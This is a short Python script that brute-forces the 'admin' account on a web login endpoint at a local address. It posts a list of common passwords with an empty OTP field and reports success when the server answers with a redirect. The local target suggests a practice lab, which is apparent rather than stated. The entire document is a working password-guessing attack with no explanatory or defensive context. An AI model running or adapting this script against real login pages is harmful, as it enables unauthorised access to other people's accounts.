import requests

url = 'http://127.0.1.1:5000/user/login'
username = 'admin'

passwords = [
    '1', '12', '123', '1234', '12345',
    '123456', '12345678', 'SuperSecret', '123123123'
]

print(f"Brute forcing user: {username}")
print("-" * 40)

for password in passwords:
    data = {'username': username, 'password': password, 'otp': ''}
    r = requests.post(url, data=data, allow_redirects=False)

    if r.status_code == 302:
        print(f"[SUCCESS] Password found: {password}")
        break
    else:
        print(f"[FAILED] Tried: {password}")